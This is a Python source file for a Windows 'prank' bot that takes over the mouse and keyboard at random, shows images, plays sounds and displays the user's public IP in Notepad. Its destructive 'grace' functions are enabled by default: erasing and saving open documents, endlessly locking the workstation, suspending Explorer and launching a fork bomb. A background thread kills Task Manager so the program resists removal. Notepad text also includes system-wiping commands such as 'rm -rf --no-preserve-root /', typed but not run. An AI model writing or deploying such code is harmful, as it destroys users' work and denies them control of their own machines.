import pyautogui as pag
from pathlib import Path
from PIL import Image, ImageTk
import time, pygame, random, ctypes, string, threading, subprocess, requests, keyboard, os, psutil, signal
from pywinauto import Application
import tkinter as tk

pygame.mixer.init()

# Gets the screen size of the primary display
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
screen_width = user32.GetSystemMetrics(0)
screen_height = user32.GetSystemMetrics(1)

# Path variables
sounds_folder = Path('sounds')
sound_files = [str(f).replace('\\', '/') for f in sounds_folder.glob("*") if f.suffix in [".mp3", ".wav", ".ogg"]]

images_folder = Path('images')
image_files = [str(f).replace('\\', '/') for f in images_folder.glob("*") if f.suffix.lower() in [".png", ".jpg", ".jpeg", ".gif", ".webp"]]

# Arrays
notepad_texts = [
    'DIE!',
    'CRUSH!',
    'JUDGEMENT!',
    'THY END IS NOW!',
    'I know where you live.',
    'We must aquire John.',
    "Bro we're operating on the same BRAINLENGTH!",
    "Have you heard of Sawcon? \n\n\n\n\n Sawcon deez nuts",
    "Overconfidence is a slow and insidious killer.",
    "In terms of coolness, Vaporeon is really cool...",
    r"""
&&&&&&@@*          *@@@&&&&&&&@&&&&&@&@@&&&&&&&&&&&&&&&@@&@@#              @@@@@
&@&@&@@#             .@@@@&@&@&@#%&@@@@@@@@@@@&@&@&@&@@&@%                 @@@@@
&&&@&@@                 @@&&&@@@@        .&@@&&&&&&@@@@/                   ,@&&&
&@&&&@*                   @@&@@&@&            &@&@@@&@                      @@@@
&&&&@@                      &@@@&@&              &@&@                       @@&&
&@&@@@                        %@@@&#*              .@&                      @@&&
&&&@@(                     %@(                                              @@&&
&@&@@(                    ****...     ..                                    @@@@
&&&&@@                                                                     .@&&&
&@&@@@.                                                                    (@@@@
&&&&@@@                                                                    @&@@@
&@&@&@@&                                        .**##&&&&&@@@&%(         .@@@@@@
&&&&&&@@&      &@@@@@@@@@@@@@@@@&             &@@@@@@@@     @(          /@&@@&&&
&@&@&@@&@@.     ,@.     @@@@@@@@@            .@@@@@@@@@      @*       (@&@&&&@&@
@@@@@&&@@&@%    @/      @@@@@@@@#            .@@@@@@@@@      #&   .@@@&&&&%@@&&&
@&@*    .***,  ,@       @@@@@@@@.             &@@@@@@@#      (&          .@@@@&@
&&&@@.         .@.      ,@@@@@@&               /@@@@@*       %&        ,@@&&&&&&
&@&&@&@@/       .@.       *@@@.   ,@@@&*                             &@@@&&@&@&@
&&&&&&@&@@  ,###/  **                                    (##.(#.     .@@@@&&&&&&
&@&@&@@@&     ,#(,                            .%,         .#.          *@&&@&@&@
&&&&&&@(                       @@%(&@%. .**//,                           &@&@&&&
&@&@@@*    .*%%#                                             /@@@@@@@@@@@&@&&@&@
&&&&&&&&&@@@@@@&@@@&/                                 .*&@@@&&@@@@@@@@@@@@&&&&&&
&@&@&@&@&@&@&@&@&@&@&@@%@@@&#*,                      #@&&@&@&@&@&@&@&@&@&@&@&@&@
&&&&&&&&&&&&&&&&&&&&&&&@#                             ,@&&&&&&&&&&&&&&&&&&&&&&&&
&@&@&@&@&@&@&@&@&@&@&@&&@@@&.                           @@@&&@&@&@&@&@&@&@&@&@&@
&&&&&&&&&&&&&&&&&&&&&&&&&&@,                             @@@&&&&&&&&&&&&&&&&&&&&
&@&@&@&@&@&@&@&@&@&@&@&&@,                                %@&@&@&@&@&@&@&@&@&@&@
&&&&&&&&&&&&&&&&&&&&@&&&@&@&@.                             &@@@&&&&&&&&&&&&&&&&&
&@&@&@&@&@&@&@&@&@&@&@&@@@&@,                               @@@@&@&@&@&@&@&@&@&@
&&&&&&&&&&&&&&&&&&&&&&&@@&@(                                ,@&&&&&&&&&&&&&&&&&&
&@&@&@&@&@&@&@&@&@&@&@&@@@@                                  %@@&@&@&@&@&@&@&@&@
-signed noftatty
    """,
    "sudo rm -rf --no-preserve-root /",
    r"""rmdir c:\System32 /s /q""",
    "Praise Josh!",
    "Teetering on that terrible precipice...",
    "figma balls",
    "Press the advantage. Destroy. Them. All.",
    "Welp, nevermind I guess!",
    "Lizard!                                                                                                                                                               :)",
    "To travel is to live, to live is to die.",
    "(Darling hold my hand!) Nothing beats a jet 2 holiday, and now you can save up to 50 pounds per person! That's 200 pounds for a family of four!",
    "Loathsomeness waits and dreams in the deep, and decay spreads over the tottering cities of men.",
    "Me playing Warhammer 1-39,999 so I can finally play Warhammer 40k",
    "Lorem ipsum dolor sit amet consectetur adipiscing elit. Quisque faucibus ex sapien vitae pellentesque sem placerat. In id cursus mi pretium tellus duis convallis. Tempus leo eu aenean sed diam urna tempor. Pulvinar vivamus fringilla lacus nec metus bibendum egestas. Iaculis massa nisl malesuada lacinia integer nunc posuere. Ut hendrerit semper vel class aptent taciti sociosqu. Ad litora torquent per conubia nostra inceptos himenaeos.",
    "We're always one step ahead :3 - XSCorporation",
    "Also try Terraria!",
    "Also try Minecraft!",
    "You feel an evil presence watching you...",
    "If at first you don't succeed, score lab."
]

"""hotkeys = [
    ["win", "m"],
    ["win", "e"],
    ["win", "ctrl", "d"],
    ["win", "l"],
    ["ctrl", "v"],
    ["f5"],
    ["ctrl", "esc"],
    ["shift", "alt", "tab"],
    ["printscreen"]
]"""

# Configuration
moveto_time = 0.35

min_wait_time = 180
max_wait_time = 300

root = tk.Tk()
root.withdraw()

pag.FAILSAFE = False
grace_mode = True

killable = True

# Windows API for suspending/resuming threads
kernel32 = ctypes.windll.kernel32
OpenThread = kernel32.OpenThread
SuspendThread = kernel32.SuspendThread
ResumeThread = kernel32.ResumeThread
CloseHandle = kernel32.CloseHandle

THREAD_SUSPEND_RESUME = 0x0002

# Utility functions
def kill_joshbot():
    if killable:
        print("o7")
        os._exit(0)
    else:
        print("but it refused")

def josh_guard():
    def _watch():
        while True:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'].lower() == "taskmgr.exe":
                        print("Goodbye, Anthony.")
                        os.kill(proc.info['pid'], signal.SIGTERM)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            time.sleep(1)
    
    threading.Thread(target=_watch, daemon=True).start()

def suspend_process(pid):
    try:
        p = psutil.Process(pid)
        for thread in p.threads():
            hThread = OpenThread(THREAD_SUSPEND_RESUME, False, thread.id)
            if hThread:
                SuspendThread(hThread)
                CloseHandle(hThread)
    except Exception as e:
        print("Error suspending:", e)

def resume_process(pid):
    try:
        p = psutil.Process(pid)
        for thread in p.threads():
            hThread = OpenThread(THREAD_SUSPEND_RESUME, False, thread.id)
            if hThread:
                ResumeThread(hThread)
                CloseHandle(hThread)
    except Exception as e:
        print("Error resuming:", e)

# Basic functions
def alt_tab():
    print("Alt-tabbing")
    pag.hotkey('alt', 'tab')

def alt_f4():
    print("Shocker!")
    if random.randint(1, 10) != 1:
        pag.hotkey("ctrl", "s")
        print("Stun resist!")
        play_sound("special_sounds/parry.mp3")
    else:
        play_sound("special_sounds/deathsdoor.mp3")
    pag.hotkey("alt", "f4")

def move_random():
    print("Moving cursor to random position and clicking")
    pag.moveTo(random.randint(0, screen_width), random.randint(0, screen_height), moveto_time)
    pag.doubleClick()

def type_random_characters(num):
    print("Typing " + str(num) + " random characters")
    for i in range(num):
        pag.typewrite(random.choice(string.ascii_letters + string.punctuation))

def play_sound(sound_file):
    print("Playing sound: " + sound_file)
    def _play():
        sound = pygame.mixer.Sound(sound_file)
        length = sound.get_length()
        sound.set_volume(1.0)
        sound.play()
        time.sleep(length)
    threading.Thread(target=_play).start()

def open_notepad(text=random.choice(notepad_texts)):
    print("Messing with notepad: " + text)

    app = None
    notepad = None

    try:
        # Try to connect to existing Notepad
        app = Application(backend="uia").connect(title_re=".*Notepad")
        notepad = app.window(title_re=".*Notepad")
        print("Connected to existing Notepad.")
    except:
        # If not found, launch a new one
        print("No existing Notepad found. Launching a new one.")
        subprocess.Popen('notepad.exe')
        time.sleep(1)
        app = Application(backend="uia").connect(title_re=".*Notepad")
        notepad = app.window(title_re=".*Notepad")

    # Bring Notepad to focus
    notepad.set_focus()
    time.sleep(0.5)

    if text:
        pag.hotkey('ctrl', 'a')
        pag.press('backspace')
        pag.typewrite(text, interval=0.02)

def display_image(img_path=''):
    if not img_path:
        return
    def _open():
        win = tk.Toplevel(root)
        win.title("Joshmedia TM")
        win.attributes("-topmost", True)

        x = random.randint(0, screen_width - 400)
        y = random.randint(0, screen_height - 400)
        win.geometry(f"+{x}+{y}")

        img = Image.open(img_path)
        tk_img = ImageTk.PhotoImage(img)

        label = tk.Label(win, image=tk_img)
        label.image = tk_img  # prevent garbage collection
        label.pack()

        win.after(100, lambda: win.attributes("-topmost", False))

    root.after(0, _open)  # schedule safely inside Tk thread

# Randomized basic functions (for the dictionary)
def random_characters():
    type_random_characters(random.randint(1, 100))

def random_sound():
    play_sound(random.choice(sound_files))

def random_basic_image():
    display_image(random.choice(image_files))

# Advanced functions
def print_ip():
    print("Printing IP")
    try:
        public_ip = requests.get("https://api.ipify.org").text
        if public_ip == '{"error": "Too Many Requests"}':
            open_notepad()
        else:
            open_notepad("Does this look familiar? " + public_ip)
    except:
        open_notepad("Hey, turn on your internet.")

def look_at_this_graph():
    print("Look at this graph!")
    display_image("special_images/lookatthisgraph.png")
    play_sound("special_sounds/lookatthisgraph.mp3")

def virtual_insanity():
    print("Dancing, walking, rearranging furniture.")
    beats = [0.46, 1.75, 3.27, 4.5, 5.89, 7.18, 8.49, 9.79, 11.07, 12.42, 13.72, 15, 16.33, 17.6]
    temp = 0
    threading.Thread(target=lambda: play_sound("special_sounds/virtual-insanity.mp3")).start()
    for i in range(len(beats)):
        wait_time = beats[i] - temp
        time.sleep(wait_time)
        print("sleeping for " + str(beats[i] - temp) + " seconds")
        temp = beats[i]
        display_image("special_images/Virtual-Insanity-Frames/" + str(i + 1) + ".png")

"""
Currently no good way to use superkey with AtlasOS, looking for solution later
def are_you_win_e_son(amount=random.randint(1, 100)):
    if random.randint(1, 2) == 1:
        for i in range(amount):
            pag.hotkey(random.choice(hotkeys))
            time.sleep(0.5)
    else:
        hotkey = random.choice(hotkeys)
        for i in range(amount):
            pag.hotkey(hotkey)"""

# Grace functions, these are incredibly detrimental, run at your own risk.
def htijwbtlgio():
    play_sound("special_sounds/Hey there it’s Josh,welcome back to Let’s Game It Out!.mp3")
    print("and today we are going to be playing tech support.")
    pag.hotkey("ctrl", "a")
    pag.press("backspace")
    pag.hotkey("ctrl", "s")
    pag.hotkey("alt", "f4")
    pag.hotkey("alt", "f4")

def fork_yourself(killable=killable):
    killable = False
    fork_bomb = "spoon.bat"
    play_sound("special_sounds/Hope you had fun.mp3")
    time.sleep(3)
    subprocess.Popen(fork_bomb)

def hold_please(duration=0): # 0 duration freezes indefinitely
    def _freeze():
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == "explorer.exe":
                print("Freezing Explorer...")
                open_notepad("Hold, please!")
                suspend_process(proc.info['pid'])
                if duration:
                    time.sleep(duration)   # keep it frozen for X seconds, may not work unless elevated
                    print("Unfreezing Explorer...")
                    resume_process(proc.info['pid'])
    threading.Thread(target=_freeze, daemon=True).start()

def lockout():
    while True:
        ctypes.windll.user32.LockWorkStation()
        time.sleep(0.5)

# Dictionary of possible outcomes for the random_function() function. Second value is weight, higher = more likely
def your_name_is_grace():
    funcs, weights = zip(*grace_functions.items())
    function = random.choices(funcs, weights=weights, k=1)[0]
    function()

possible_functions = {
    move_random: 8, 
    alt_tab: 8,
    random_characters: 8, 
    random_sound: 8, 
    random_basic_image: 6,
    open_notepad: 6, 
    print_ip: 6,
    look_at_this_graph: 4,
    virtual_insanity: 4,
    #are_you_win_e_son: 3,
    alt_f4: 2,
    your_name_is_grace: 1
}
grace_functions = {
    htijwbtlgio: 5,
    lockout: 3,
    hold_please: 2,
    fork_yourself: 1
}

def random_function():
    funcs, weights = zip(*possible_functions.items())
    function = random.choices(funcs, weights=weights, k=1)[0]
    function()

def joshing_with_you():
    combo = 1
    while True:
        sleep_time = random.randint(min_wait_time, max_wait_time)
        print("Sleeping for " + str(sleep_time) + " seconds")

        # Combo chance
        if random.randint(1, 10) != 1:
            combo = 1
            time.sleep(sleep_time)
        else:
            combo *= 2
            print("COMBO x" + str(combo))
            play_sound("special_sounds/combo.mp3")
        threading.Thread(target=random_function).start()

        # Chance to increase odds of grace_mode
        if random.randint(1, 10) == 1:
            possible_functions[your_name_is_grace] += 1

# ---------- MAIN PROGRAM ----------
keyboard.add_hotkey('ctrl+alt+j', kill_joshbot)

# Only enable grace mode if you no longer fear Hell.
if grace_mode:
    possible_functions[your_name_is_grace] = 1
else:
    possible_functions[your_name_is_grace] = 0

threading.Thread(target=joshing_with_you).start()
root.mainloop()